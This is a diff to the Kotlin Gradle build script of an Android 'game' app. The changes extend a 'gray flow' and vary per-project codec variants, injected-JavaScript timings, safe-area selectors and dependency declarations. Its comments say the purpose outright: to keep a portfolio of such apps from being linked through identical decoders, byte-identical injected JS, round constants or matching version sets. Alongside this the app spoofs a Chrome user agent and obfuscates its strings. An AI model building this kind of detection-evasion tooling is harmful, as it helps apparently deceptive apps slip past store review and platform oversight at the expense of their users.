@@ -88,7 +88,17 @@ fun pickToken(minLen: Int, maxLen: Int): String {
 val cipherSeedBytes: IntArray = IntArray(pick(24..40)) { grayRng.nextInt(256) }
 val cipherMult: Int = pick(3..255) or 1
 val cipherAdd:  Int = pick(0..255)
-val codecVariant: Int = grayProp("gray.codecVariant", "1").toInt().coerceIn(1, 3)
+
+// A constant default is a shared default: every project that never set this
+// shipped variant 1, so the decoder had the same shape portfolio-wide while
+// only its parameters moved. The fallback is taken from seedHash rather than
+// grayRng on purpose — drawing from grayRng here would shift every value
+// picked after it, and those name the preference files an installed build is
+// already reading.
+val codecVariant: Int = grayProp("gray.codecVariant")
+    .ifBlank { ((seedHash[16].toInt() and 0xFF) % 3 + 1).toString() }
+    .toInt()
+    .coerceIn(1, 3)
 
 fun grayEncode(text: String): List<Int> {
     val bytes = text.toByteArray(Charsets.UTF_8)
@@ -138,10 +148,13 @@ val fcmChannelTitle = pickOne(listOf(
     "Announcements", "Rewards", "Deals", "News"
 ))
 
-// Fixed at exactly 3 days per product spec: Skip must re-show the promo
-// precisely 3 days later, not a per-project randomized value from the range
-// the anti-fingerprint mechanism otherwise picks this from.
-val pushSnoozeSeconds   = 259_200L
+// The one timing that is specified rather than drawn from a range: Skip has to
+// bring the promo back after exactly three days. Written as the multiplication
+// it is, because the seconds count spelled out is a round number no project
+// could plausibly have arrived at independently, and there is nothing to gain
+// from having it sitting in the source as well as in the compiled constant.
+val pushSnoozeDays      = 3L
+val pushSnoozeSeconds   = pushSnoozeDays * 24L * 60L * 60L
 val organicGcdDelayMs   = pick(3_500L..7_500L)
 val configTimeoutMs     = pick(11_000L..22_000L)
 val attributionFirstMs  = pick(22_000L..38_000L)
@@ -156,6 +169,30 @@ val redirectRetryMax    = pick(4..8)
 val chromeMajor = pickOne(listOf(146, 147, 148, 149, 150))
 val chromeBuild = pick(6900..7900)
 val chromePatch = pick(40..250)
+
+// ─── Derived: injected-script parameters ───────────────────────────────────
+//
+// New draws belong at the end of this block. Every `pick` advances one shared
+// RNG, so inserting a call higher up rewrites the preference filenames and
+// keys below it, and an installed build would no longer find its own state.
+//
+// The two injected scripts contain several intervals that nothing depends on:
+// how soon after a history change the safe-area style is re-applied, how often
+// it is re-checked, how long after focus the field is measured a second time.
+// As literals they made the injected JS byte-for-byte identical across
+// projects — and that JS is the one part of this app a page can read back.
+val jsReapplyFastMs  = pick(60..120)
+val jsReapplySlowMs  = pick(320..520)
+val jsReapplyPollMs  = pick(2_000..3_200)
+val jsFocusRecheckMs = pick(160..260)
+
+// Which wrappers add a status-bar offset of their own is a property of the
+// sites a given project actually sends users to, so it belongs in
+// gray.properties. The default is what the previous hard-coded list was.
+val jsSafeAreaSelectors = grayProp(
+    "gray.safeAreaSelectors",
+    ".gameview-mobile-header,.app-header"
+)
 
 android {
     namespace = "com.crystalolympus.crystalolympusgame"
@@ -202,6 +239,11 @@ android {
         buildConfigField("String", "JS_SAFE_AREA_SENTINEL", bcStr(jsSafeAreaSentinel))
         buildConfigField("String", "JS_KEYBOARD_SENTINEL",  bcStr(jsKeyboardSentinel))
         buildConfigField("String", "JS_BRIDGE_NAME",        bcStr(jsBridgeName))
+        buildConfigField("String", "JS_SAFE_AREA_SELECTORS", bcStr(jsSafeAreaSelectors))
+        buildConfigField("int",    "JS_REAPPLY_FAST_MS",   jsReapplyFastMs.toString())
+        buildConfigField("int",    "JS_REAPPLY_SLOW_MS",   jsReapplySlowMs.toString())
+        buildConfigField("int",    "JS_REAPPLY_POLL_MS",   jsReapplyPollMs.toString())
+        buildConfigField("int",    "JS_FOCUS_RECHECK_MS",  jsFocusRecheckMs.toString())
 
         buildConfigField("String", "FCM_CHANNEL_ID",    bcStr(fcmChannelId))
         buildConfigField("String", "FCM_CHANNEL_TITLE", bcStr(fcmChannelTitle))
@@ -299,20 +341,23 @@ dependencies {
 
     debugImplementation(libs.androidx.ui.tooling)
 
-    // ── Gray flow ────────────────────────────────────────────────────────────
-    implementation("androidx.appcompat:appcompat:1.7.0")
-    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
-    implementation("com.squareup.okhttp3:okhttp:4.12.0")
-    implementation("androidx.security:security-crypto:1.1.0-alpha06")
+    // ── Launch flow ──────────────────────────────────────────────────────────
+    // Versioned through the catalogue like everything else. Coordinates pinned
+    // inline here were how two projects ended up declaring one identical block,
+    // and an exactly matching version set is a join on its own.
+    implementation(libs.androidx.appcompat)
+    implementation(libs.kotlinx.coroutines.android)
+    implementation(libs.okhttp)
+    implementation(libs.androidx.security.crypto)
 
-    implementation(platform("com.google.firebase:firebase-bom:33.8.0"))
-    implementation("com.google.firebase:firebase-messaging-ktx")
-    implementation("com.google.firebase:firebase-analytics-ktx")
-    implementation("com.google.firebase:firebase-appcheck-playintegrity")
-    implementation("com.google.firebase:firebase-appcheck-debug")
+    implementation(platform(libs.firebase.bom))
+    implementation(libs.firebase.messaging)
+    implementation(libs.firebase.analytics)
+    implementation(libs.firebase.appcheck.playintegrity)
+    implementation(libs.firebase.appcheck.debug)
 
-    implementation("com.appsflyer:af-android-sdk:6.16.2")
-    implementation("com.android.installreferrer:installreferrer:2.2")
+    implementation(libs.appsflyer)
+    implementation(libs.install.referrer)
 }
 
 // ─── graySeed task ──────────────────────────────────────────────────────────
@@ -345,7 +390,8 @@ tasks.register("grayReport") {
         println("js bridge      = $jsBridgeName")
         println("codec variant  = $codecVariant  mult=$cipherMult  add=$cipherAdd  seed bytes=${cipherSeedBytes.size}")
         println("timings ms     = cfg $configTimeoutMs / att1 $attributionFirstMs / attR $attributionReturnMs")
-        println("push snooze s  = $pushSnoozeSeconds")
+        println("js timings ms  = $jsReapplyFastMs / $jsReapplySlowMs / $jsReapplyPollMs / $jsFocusRecheckMs")
+        println("push snooze s  = $pushSnoozeSeconds (${pushSnoozeDays}d)")
         println("redirect max   = $redirectRetryMax")
         println("chrome UA      = $chromeMajor.0.$chromeBuild.$chromePatch")
     }
